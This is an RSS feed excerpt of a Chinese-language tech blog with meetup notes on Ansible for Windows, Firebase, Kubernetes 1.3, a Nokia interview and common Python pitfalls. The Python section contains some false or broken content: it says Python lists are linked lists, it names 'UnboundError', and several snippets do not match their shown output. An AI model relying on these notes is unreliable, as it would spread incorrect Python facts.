&lt;li&gt;遇到 &lt;code&gt;\&lt;/code&gt; 可以是用 &lt;code&gt;\\&lt;/code&gt; 來代替，因為 Windows 原先就會這樣解析路徑。  &lt;/li&gt;
&lt;li&gt;特殊符號解析有誤？  &lt;ul&gt;
&lt;li&gt;先寫好批次檔  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;在 Playbooks 裡，&lt;code&gt;/&lt;/code&gt; 作為路徑的分隔符號是有效的。  &lt;/li&gt;
&lt;/ol&gt;
&lt;h2&gt;Ansible 常用的 Windows 有哪些？&lt;/h2&gt;
&lt;ol&gt;
&lt;li&gt;&lt;code&gt;raw&lt;/code&gt;: Executes a low-down andy dirty SSH command.  &lt;/li&gt;
&lt;li&gt;&lt;code&gt;win_copy&lt;/code&gt;  &lt;/li&gt;
&lt;li&gt;&lt;code&gt;win_file&lt;/code&gt;  &lt;/li&gt;
&lt;li&gt;&lt;code&gt;win_get_url&lt;/code&gt;  &lt;/li&gt;
&lt;li&gt;&lt;code&gt;win_lineinfile&lt;/code&gt;  &lt;/li&gt;
&lt;li&gt;&lt;code&gt;win_msi&lt;/code&gt;  &lt;/li&gt;
&lt;li&gt;&lt;code&gt;win_ping&lt;/code&gt;  &lt;/li&gt;
&lt;li&gt;...  &lt;/li&gt;
&lt;li&gt;...  &lt;/li&gt;
&lt;li&gt;...  &lt;/li&gt;
&lt;/ol&gt;
&lt;h2&gt;References&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://github.com/chusiang/studyarea1607-ansible-demo"&gt;GitHub - chusiang/studyarea1607-ansible-demo: Ansible Playbook Roles Demo on StudyArea Summit 2016.&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="https://www.ansible.com/ansible-book"&gt;Ansible Up and Running eBook Preview | Ansible.com&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;h2&gt;Q&amp;amp;A&lt;/h2&gt;
&lt;p&gt;Q: Playbooks 怎麼管理比較好？&lt;br /&gt;
A: 可以參考 &lt;a href="https://docs.ansible.com/ansible/playbooks_best_practices.html"&gt;Best Practices — Ansible Documentation&lt;/a&gt;  &lt;/p&gt;
&lt;p&gt;Q: 是不是一定要透過 MSI? 有沒有遇過 AD server 上的問題？&lt;br /&gt;
A: AD server 的雷有遇到，然後因為我其實比較常用 Linux 和 Mac，所以大部份都是從 &lt;a href="https://docs.ansible.com/ansible/list_of_windows_modules.html"&gt;Windows Modules — Ansible Documentation&lt;/a&gt; 拿一些現成的來用。  &lt;/p&gt;
&lt;hr /&gt;
&lt;h1&gt;Nokia Bell Labs 面試經驗 by 小飛機&lt;/h1&gt;
&lt;h2&gt;心得&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;英文超級無敵重要  &lt;/li&gt;
&lt;li&gt;平時要多參與 Open Source 專案累積經驗  &lt;blockquote&gt;
&lt;p&gt;個人覺得還要注意的重點是深度，而且專案最好都要彼此有相關。  &lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;面試一定要準備  &lt;/li&gt;
&lt;li&gt;做的專案要能夠適當的行銷  &lt;ul&gt;
&lt;li&gt;雖然當時的重點是放在怎麼 promote Taiwan  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;正常歐洲處理速度超慢  &lt;ul&gt;
&lt;li&gt;從第一天寄信到面試過了一個月  &lt;/li&gt;
&lt;li&gt;歐洲還會放暑假  &lt;/li&gt;
&lt;li&gt;下班就下班了，沒在看 mail 的，所以約的時間常常很慢才看到就錯過。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;當然還需要點運氣  &lt;/li&gt;
&lt;/ul&gt;</description><dc:creator xmlns:dc="http://purl.org/dc/elements/1.1/">m157q</dc:creator><pubDate>Sat, 16 Jul 2016 16:28:58 +0800</pubDate><guid isPermaLink="false">tag:blog.m157q.tw,2016-07-16:posts/2016/07/16/study-area-summit-2016/</guid><category>SDN</category><category>DevOps</category><category>DC/OS</category><category>ePUB</category><category>Git</category><category>Ansible</category></item><item><title>GCPUG.TW 20160706</title><link>https://blog.m157q.tw/posts/2016/07/06/gcpug-tw-20160706/</link><description>&lt;h2&gt;Firebase&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;Restful  &lt;/li&gt;
&lt;li&gt;Real-time database  &lt;/li&gt;
&lt;li&gt;Easily authentication with OAuth&lt;br /&gt;
&lt;code&gt;ref.authWithOAuthPopup("twitter", function (error, authData) {  
    ...  
}&lt;/code&gt;  &lt;/li&gt;
&lt;li&gt;Offline support  &lt;ul&gt;
&lt;li&gt;Offline 的時候仍可繼續更改，有網路的時候會自動做 background sync  &lt;/li&gt;
&lt;li&gt;有個要注意的問題是如果有多個人以上修改的話，會以最後修改的那個為主。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Demo  &lt;ul&gt;
&lt;li&gt;&lt;a href="https://mmoasteroids.firebaseapp.com/"&gt;https://mmoasteroids.firebaseapp.com/&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="https://ray-tetris.firebaseapp.com/"&gt;https://ray-tetris.firebaseapp.com/&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="https://firechess-demo.firebaseapp.com/#TzA4m"&gt;https://firechess-demo.firebaseapp.com/#TzA4m&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="https://ray-livecode.firebaseapp.com/"&gt;https://ray-livecode.firebaseapp.com/&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Related Links  &lt;ul&gt;
&lt;li&gt;&lt;a href="https://firebase.googleblog.com/2014/06/geofire-20.html"&gt;https://firebase.googleblog.com/2014/06/geofire-20.html&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;&lt;a href="https://github.com/firebase/geofire-js"&gt;https://github.com/firebase/geofire-js&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="https://www.sflivebus.com/"&gt;https://www.sflivebus.com/&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="https://firepad.io"&gt;https://firepad.io&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;&lt;a href="https://github.com/firebase/firepad/"&gt;https://github.com/firebase/firepad/&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="https://firebase.google.com/pricing/"&gt;https://firebase.google.com/pricing/&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;hr /&gt;
&lt;h2&gt;Kubernetes&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://github.com/kubernetes/kubernetes/wiki/Release-1.3"&gt;Kubernetes 1.3&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;Pet Sets  &lt;/li&gt;
&lt;li&gt;Init Containers  &lt;ul&gt;
&lt;li&gt;Sequential Pod Initialization  &lt;/li&gt;
&lt;li&gt;開啟真正的 Application 的時候必須經過一些初始化步驟，1.3 以後可以使用 Init containers 來達到這個功能。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Jobs  &lt;ul&gt;
&lt;li&gt;Work Queue with Pod per work  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Cluster Federation  &lt;ul&gt;
&lt;li&gt;Manage clusters across region and providers  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="https://github.com/kubernetes/minikube"&gt;minikube&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Related Links  &lt;ul&gt;
&lt;li&gt;&lt;a href="https://codelabs.developers.google.com/codelabs/cloud-hello-kubernetes/index.html?index=..%2F..%2Findex#0"&gt;Hello Node Kubernetes Codelab&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="https://codelabs.developers.google.com/codelabs/cloud-orchestrate-with-kubernetes/index.html?index=..%2F..%#0"&gt;Orchestrating the Cloud with Kubernetes&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="https://codelabs.developers.google.com/codelabs/cloud-slack-bot/index.html?index=..%2F..%2Findex#0"&gt;Build a Slack Bot with Node.js on Kubernetes&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="https://codelabs.developers.google.com/codelabs/cloud-compute-kubernetes/index.html?index=..%2F..%2Findex#0"&gt;Compute Engine &amp;amp; Kubernetes (Container Engine)&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;</description><dc:creator xmlns:dc="http://purl.org/dc/elements/1.1/">m157q</dc:creator><pubDate>Wed, 06 Jul 2016 22:59:41 +0800</pubDate><guid isPermaLink="false">tag:blog.m157q.tw,2016-07-06:posts/2016/07/06/gcpug-tw-20160706/</guid><category>GCPUG.TW</category><category>Firebase</category><category>Kubernetes</category></item><item><title>Taipei.py 20160630</title><link>https://blog.m157q.tw/posts/2016/06/30/taipei-py-20160630/</link><description>&lt;ul&gt;
&lt;li&gt;&lt;a href="http://www.meetup.com/Taipei-py/events/230363477/"&gt;http://www.meetup.com/Taipei-py/events/230363477/&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;hr /&gt;
&lt;h2&gt;Python 中常遇到的小錯誤 - Tim&lt;/h2&gt;
&lt;h3&gt;Space vs Tab&lt;/h3&gt;
&lt;p&gt;若是縮排減少，會把堆疊 pop 到縮排與堆疊頂端一致。  &lt;/p&gt;
&lt;h3&gt;Default Argument&lt;/h3&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;def play(song_list=[]):  
    song_list.append(&amp;#39;a random song&amp;#39;)  
    print(song_list)  

play()  
play()  
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;=&amp;gt;  &lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;[&amp;#39;a random song&amp;#39;]  
[&amp;#39;a random song&amp;#39;, &amp;#39;a random song&amp;#39;]  
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;初始化只會初始一次  &lt;/p&gt;
&lt;h3&gt;Closure&lt;/h3&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;def outer():  
    outer_variable = 10  

    def common():  
        print(outer_variable)  

    outer_variable = 100  

    return common  
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;=&amp;gt;  &lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;outer()()  

100  
&lt;/pre&gt;&lt;/div&gt;


&lt;ul&gt;
&lt;li&gt;當產生 Closure 的時候，Python 並沒有執行函數內的程式。  &lt;/li&gt;
&lt;li&gt;裡面的變數還沒有取得 reference，Python 只是記住變數名字而已(Lexical Scope)  &lt;/li&gt;
&lt;li&gt;被 closure 記住的變數，不會立刻被 GC。  &lt;/li&gt;
&lt;/ul&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;def outer():  
    outer_variable = 10  

    def common(parameter=outer_variable):  
        print(parameter)  

    outer_variable = 100  

    return common  
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;=&amp;gt;  &lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;outer()()  

10  
&lt;/pre&gt;&lt;/div&gt;


&lt;ul&gt;
&lt;li&gt;改成用 &lt;code&gt;class&lt;/code&gt;, 並使用 &lt;code&gt;__call__&lt;/code&gt;。資源抓取會更清楚，而不是依賴 lexical scope。  &lt;/li&gt;
&lt;li&gt;或是使用 &lt;code&gt;functool.partial&lt;/code&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;Global variable&lt;/h3&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;value = 10  

def change():  
    value = 20  

change()  
print(value)  

=&amp;gt; 10  
&lt;/pre&gt;&lt;/div&gt;


&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;value = 10  

def change():  
    value = value + 20  

change()  
print(value)  

=&amp;gt; UnboundError  
&lt;/pre&gt;&lt;/div&gt;


&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;value = 10  

def change():  
    global value  
    value += 10  

change()  
print(value)  

=&amp;gt; 20  
&lt;/pre&gt;&lt;/div&gt;


&lt;h3&gt;del&lt;/h3&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="kr"&gt;class&lt;/span&gt; &lt;span class="nx"&gt;SimpleType&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;object&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt;  
    &lt;span class="nx"&gt;def&lt;/span&gt; &lt;span class="nx"&gt;__init__&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;self&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt;  
        &lt;span class="nx"&gt;print&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;simple born&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;  
    &lt;span class="nx"&gt;def&lt;/span&gt; &lt;span class="nx"&gt;__del__&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;self&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt;  
        &lt;span class="nx"&gt;print&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;simple born&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;  

&lt;span class="nx"&gt;simple&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nx"&gt;SimpleType&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;  
&lt;span class="nx"&gt;del&lt;/span&gt; &lt;span class="nx"&gt;simple&lt;/span&gt;  
&lt;/pre&gt;&lt;/div&gt;


&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="kr"&gt;class&lt;/span&gt; &lt;span class="nx"&gt;FooType&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;object&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt;  
    &lt;span class="nx"&gt;def&lt;/span&gt; &lt;span class="nx"&gt;__init__&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;self&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="nx"&gt;parent&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt;  
        &lt;span class="nx"&gt;self&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;parent&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nx"&gt;parent&lt;/span&gt;  
        &lt;span class="nx"&gt;print&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;Foo born&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;  

    &lt;span class="nx"&gt;def&lt;/span&gt; &lt;span class="nx"&gt;__del__&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;self&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt;  
        &lt;span class="nx"&gt;print&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;Foo died&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;  

&lt;span class="kr"&gt;class&lt;/span&gt; &lt;span class="nx"&gt;BarType&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;object&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt;  
    &lt;span class="nx"&gt;def&lt;/span&gt; &lt;span class="nx"&gt;__init__&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;self&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt;  
        &lt;span class="nx"&gt;self&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nx"&gt;FooType&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;self&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;  
        &lt;span class="nx"&gt;print&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;Bar born&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;  

    &lt;span class="nx"&gt;def&lt;/span&gt; &lt;span class="nx"&gt;__del__&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;self&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt;  
        &lt;span class="nx"&gt;print&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;Bar died&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;  

&lt;span class="o"&gt;=&amp;gt;&lt;/span&gt;  
&lt;span class="nx"&gt;Foo&lt;/span&gt; &lt;span class="nx"&gt;born&lt;/span&gt;  
&lt;span class="nx"&gt;Bar&lt;/span&gt; &lt;span class="nx"&gt;born&lt;/span&gt;  
&lt;/pre&gt;&lt;/div&gt;


&lt;ul&gt;
&lt;li&gt;&lt;code&gt;del&lt;/code&gt; 只會讓名字從 symbol table 消失，並讓 reference count - 1  &lt;/li&gt;
&lt;li&gt;當 reference count 為 0 的時候，才會執行 GC 的動作(&lt;code&gt;__del__&lt;/code&gt;)  &lt;/li&gt;
&lt;li&gt;可以解決 Circular Reference 的問題  &lt;/li&gt;
&lt;li&gt;有 circular reference 的時候 Python 不會真的執行 del  &lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;Interface&lt;/h3&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="kn"&gt;from&lt;/span&gt; &lt;span class="nn"&gt;abc&lt;/span&gt; &lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="n"&gt;ABCMeta&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;abstractmethod&lt;/span&gt;  

&lt;span class="k"&gt;class&lt;/span&gt; &lt;span class="nc"&gt;Sized&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;  
    &lt;span class="vm"&gt;__metaclass__&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;ABCMeta&lt;/span&gt;  

    &lt;span class="nd"&gt;@abstractmethod&lt;/span&gt;  
    &lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="fm"&gt;__len__&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="bp"&gt;self&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;  
        &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="mi"&gt;0&lt;/span&gt;  

&lt;span class="k"&gt;class&lt;/span&gt; &lt;span class="nc"&gt;Missing&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;Sized&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;  
    &lt;span class="k"&gt;pass&lt;/span&gt;  


&lt;span class="n"&gt;Missing&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;  

&lt;span class="o"&gt;=&amp;gt;&lt;/span&gt; &lt;span class="ne"&gt;TypeError&lt;/span&gt;  
    &lt;span class="n"&gt;Can&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;t instantiate abstract class Missing with abstract methods __len__  &lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="kr"&gt;class&lt;/span&gt; &lt;span class="nx"&gt;Struggle&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;object&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt;  
    &lt;span class="nx"&gt;def&lt;/span&gt; &lt;span class="nx"&gt;__len__&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt;  
        &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="mi"&gt;23&lt;/span&gt;  

&lt;span class="nx"&gt;isinstance&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;Struggle&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="nx"&gt;Sized&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;  

&lt;span class="o"&gt;=&amp;gt;&lt;/span&gt; &lt;span class="nx"&gt;True&lt;/span&gt;  
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Duck Typing  &lt;/p&gt;
&lt;h3&gt;List related&lt;/h3&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;# Python 2  
data = range(10)  
for l in data:  
    data.remove(l)  
print(data)  
=&amp;gt; [1, 3, 5, 7, 9]  

# 跟 Python 的 list 實作採用 linked list 實作有關  
&lt;/pre&gt;&lt;/div&gt;


&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;# Python 2  
data = range(10)  
for l in data[:]:  
    data.remove(l)  
print(data)  
=&amp;gt; []  
&lt;/pre&gt;&lt;/div&gt;


&lt;h2&gt;Package&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;不要 &lt;code&gt;pip freeze &amp;gt; requirements.txt&lt;/code&gt;  &lt;ul&gt;
&lt;li&gt;會把 dependency 的 dependency 也寫進去，不知道到底真正要用的是哪些。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;2 =&amp;gt; 3&lt;/h3&gt;
&lt;h3&gt;Quality&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;flake8  &lt;ul&gt;
&lt;li&gt;install-hook  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;Inheritance&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;正確使用 &lt;code&gt;super()&lt;/code&gt; 可以避免很多問題  &lt;/li&gt;
&lt;/ul&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="kr"&gt;class&lt;/span&gt; &lt;span class="nx"&gt;Base&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;object&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt;  
    &lt;span class="nx"&gt;def&lt;/span&gt; &lt;span class="nx"&gt;__init__&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;self&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt;  
        &lt;span class="nx"&gt;print&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;init Base&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;  

&lt;span class="kr"&gt;class&lt;/span&gt; &lt;span class="nx"&gt;Left&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;Base&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt;  
    &lt;span class="nx"&gt;def&lt;/span&gt; &lt;span class="nx"&gt;__init__&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;self&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt;  
        &lt;span class="nx"&gt;print&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;init Left&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;  

&lt;span class="kr"&gt;class&lt;/span&gt; &lt;span class="nx"&gt;Right&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;Base&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt;  
    &lt;span class="nx"&gt;def&lt;/span&gt; &lt;span class="nx"&gt;__init__&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;self&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt;  
        &lt;span class="nx"&gt;print&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;init Right&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;  

&lt;span class="kr"&gt;class&lt;/span&gt; &lt;span class="nx"&gt;C&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;Left&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="nx"&gt;Right&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt;  
    &lt;span class="nx"&gt;def&lt;/span&gt; &lt;span class="nx"&gt;__init__&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;self&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt;  
        &lt;span class="nx"&gt;Left&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;__init__&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;  
        &lt;span class="nx"&gt;Right&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;__init__&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;  
        &lt;span class="nx"&gt;print&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;init C&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;  

&lt;span class="o"&gt;=&amp;gt;&lt;/span&gt;  
&lt;span class="nx"&gt;init&lt;/span&gt; &lt;span class="nx"&gt;Base&lt;/span&gt;  
&lt;span class="nx"&gt;init&lt;/span&gt; &lt;span class="nx"&gt;Left&lt;/span&gt;  
&lt;span class="nx"&gt;init&lt;/span&gt; &lt;span class="nx"&gt;Base&lt;/span&gt;  
&lt;span class="nx"&gt;init&lt;/span&gt; &lt;span class="nx"&gt;Right&lt;/span&gt;  
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;&lt;code&gt;Base.__init__()&lt;/code&gt; 有副作用的話就會很恐怖&lt;br /&gt;
正確的寫法要用 &lt;code&gt;super()&lt;/code&gt;  &lt;/p&gt;
&lt;h2&gt;Related links&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="http://python.net/~goodger/projects/pycon/2007/idiomatic/handout.html"&gt;Code Like a Pythonista: Idiomatic Python&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="https://hynek.me/articles/hasattr/"&gt;hasattr() – A Dangerous Misnomer · Homepage of Hynek Schlawack&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;不要用 &lt;code&gt;hasattr()&lt;/code&gt;，&lt;code&gt;getattr()&lt;/code&gt; 都會被執行，所以如果有副作用的話就會很恐怖。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;hr /&gt;
&lt;h2&gt;Physics of IOT - David Mikolas&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://www.lora-alliance.org/"&gt;Lora&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="https://github.com/micropython/micropython"&gt;GitHub - micropython/micropython: MicroPython - a lean and efficient Python implementation for microcontrollers and constrained systems&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;hr /&gt;
&lt;h2&gt;pynsist&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;py2exe&lt;/code&gt;  &lt;/li&gt;
&lt;li&gt;&lt;code&gt;pip install pynsist&lt;/code&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;hr /&gt;
&lt;h2&gt;Lightning talks&lt;/h2&gt;
